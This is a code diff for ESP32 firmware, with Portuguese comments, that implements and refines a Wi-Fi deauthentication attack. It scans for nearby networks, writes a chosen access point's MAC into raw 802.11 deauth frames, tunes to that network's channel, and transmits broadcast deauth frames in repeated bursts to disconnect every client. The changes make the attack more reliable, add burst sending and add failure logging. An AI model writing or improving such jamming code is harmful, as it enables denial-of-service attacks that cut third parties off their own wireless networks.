@@ -4,20 +4,19 @@
 
 // ============================================================
 // DEAUTH FRAME (Management Frame - Deauthentication)
-// Frame Control: 0xC0 = Deauth, 0x00 = flags
-// Reason code 7 = Class 3 frame received from non-associated STA
 // ============================================================
+// Frame de deauth: STA -> Broadcast (para desconectar todos)
 static uint8_t deauthFrame[26] = {
-    0xC0, 0x00,             // Frame Control: Deauth
+    0xC0, 0x00,             // Frame Control: Deauth (0xC0)
     0x3A, 0x01,             // Duration
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
     0x00, 0x00,             // Seq Ctrl
-    0x07, 0x00              // Reason code: 7
+    0x07, 0x00              // Reason: 7 = Class 3 frame from non-associated STA
 };
 
-// Frame reverso: AP -> STA (mais efetivo em alguns casos)
+// Frame reverso: Broadcast -> AP
 static uint8_t deauthFrameReverse[26] = {
     0xC0, 0x00,
     0x3A, 0x01,
@@ -29,7 +28,7 @@ static uint8_t deauthFrameReverse[26] = {
 };
 
 // ============================================================
-// CONTADORES DE DEAUTH
+// CONTADORES E ESTADO
 // ============================================================
 static uint32_t deauthPacketCount = 0;
 static uint32_t deauthSuccessCount = 0;
@@ -37,7 +36,8 @@ static uint8_t  deauthTargetChannel = 0;
 static uint8_t  deauthTargetBSSID[6] = {0};
 static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
-static bool     deauthInitialized = false;
+static uint32_t deauthFailCount = 0;
+static esp_err_t lastDeauthError = ESP_OK;
 
 // ============================================================
 // HELPERS
@@ -51,11 +51,15 @@ void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
 // ============================================================
 void scanNetworks() {
     networkCount = 0;
+
+    // Garante modo STA e desconectado
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(true);
-    delay(100);
+    delay(200);
 
     int n = WiFi.scanNetworks(false, true);
+    Serial.printf("[WiFi] Scan found %d networks\n", n);
+
     for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
         strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
         scannedNetworks[i].ssid[32] = '\0';
@@ -63,6 +67,10 @@ void scanNetworks() {
         scannedNetworks[i].rssi = WiFi.RSSI(i);
         scannedNetworks[i].channel = WiFi.channel(i);
         scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
+        Serial.printf("[WiFi] %d: %s CH%d RSSI%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
+            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
+            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
+            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
         networkCount++;
     }
     WiFi.scanDelete();
@@ -76,37 +84,17 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// INICIALIZAÇÃO DO WIFI PARA RAW TX
-// ============================================================
-static bool initWiFiRawTx() {
-    if (deauthInitialized) return true;
-
-    // Desliga power save para máxima performance
-    esp_wifi_set_ps(WIFI_PS_NONE);
-
-    // Configura modo STA
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect(true);
-
-    // Inicializa WiFi se não estiver
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_STA);
-    esp_wifi_start();
-
-    deauthInitialized = true;
-    return true;
-}
-
-// ============================================================
-// DEAUTH - ENVIO REAL DE FRAMES
+// DEAUTH
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
-    if (networkIndex >= networkCount) return;
+    if (networkIndex >= networkCount) {
+        Serial.println("[Deauth] ERROR: invalid network index");
+        return;
+    }
 
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    // Salva info do alvo
+    // Salva info
     memcpy(deauthTargetBSSID, target->bssid, 6);
     strncpy(deauthTargetSSID, target->ssid, 32);
     deauthTargetSSID[32] = '\0';
@@ -120,70 +108,89 @@ void startDeauth(uint8_t networkIndex) {
     setMAC(deauthFrameReverse, target->bssid, 4);
     setMAC(deauthFrameReverse, target->bssid, 16);
 
-    // Inicializa WiFi para raw tx
-    initWiFiRawTx();
+    // Garante modo STA desconectado
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect(true);
+    delay(100);
 
-    // MUDA PARA O CANAL DO ALVO (CRÍTICO!)
-    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
+    // MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
+    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("[Deauth] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
+        target->ssid, target->channel,
+        target->bssid[0], target->bssid[1], target->bssid[2],
+        target->bssid[3], target->bssid[4], target->bssid[5]);
+    Serial.printf("[Deauth] Set channel result: %d\n", chErr);
 
     // Reseta contadores
     deauthActive = true;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
+    deauthFailCount = 0;
+    lastDeauthError = ESP_OK;
+
+    Serial.println("[Deauth] STARTED");
 }
 
 void stopDeauth() { 
+    if (deauthActive) {
+        Serial.println("[Deauth] STOPPED");
+        Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
+            deauthPacketCount, deauthSuccessCount, deauthFailCount);
+    }
     deauthActive = false;
 }
 
 // ============================================================
-// LOOP DE DEAUTH - ENVIA FRAMES CONTINUAMENTE
+// LOOP DE DEAUTH - ENVIA FRAMES
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    // Envia múltiplos frames de uma vez para maior taxa
-    bool sent = false;
+    // Envia burst de frames para taxa alta
+    bool anySuccess = false;
 
-    // Frame 1: STA -> AP (broadcast)
-    esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-    if (err1 == ESP_OK) {
-        deauthSuccessCount++;
-        sent = true;
+    for (int burst = 0; burst < 5; burst++) {
+        // Frame 1: STA -> Broadcast
+        esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
+        if (err1 == ESP_OK) {
+            deauthSuccessCount++;
+            anySuccess = true;
+        } else {
+            lastDeauthError = err1;
+            deauthFailCount++;
+        }
+        deauthPacketCount++;
+
+        delayMicroseconds(500);
+
+        // Frame 2: Broadcast -> AP
+        esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, 26, false);
+        if (err2 == ESP_OK) {
+            deauthSuccessCount++;
+            anySuccess = true;
+        } else {
+            lastDeauthError = err2;
+            deauthFailCount++;
+        }
+        deauthPacketCount++;
+
+        delayMicroseconds(500);
     }
 
-    delayMicroseconds(1000);
-
-    // Frame 2: AP -> STA
-    esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, sizeof(deauthFrameReverse), false);
-    if (err2 == ESP_OK) {
-        deauthSuccessCount++;
-        sent = true;
+    // Debug a cada ~2 segundos
+    static uint32_t lastDebug = 0;
+    if (millis() - lastDebug > 2000) {
+        lastDebug = millis();
+        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu last_err=%d ch=%d\n",
+            deauthPacketCount, deauthSuccessCount, deauthFailCount, 
+            (int)lastDeauthError, deauthTargetChannel);
     }
 
-    delayMicroseconds(1000);
-
-    // Frame 3: Broadcast deauth
-    esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-    if (err3 == ESP_OK) {
-        deauthSuccessCount++;
-        sent = true;
-    }
-
-    deauthPacketCount += 3;
-
-    // Se falhou tudo, tenta reinicializar
-    if (!sent && deauthPacketCount > 10) {
-        deauthInitialized = false;
-        initWiFiRawTx();
-        esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
-    }
-
-    return sent;
+    return anySuccess;
 }
 
 // ============================================================
-// GETTERS PARA A UI
+// GETTERS
 // ============================================================
 uint32_t getDeauthPacketCount() { return deauthPacketCount; }
 uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
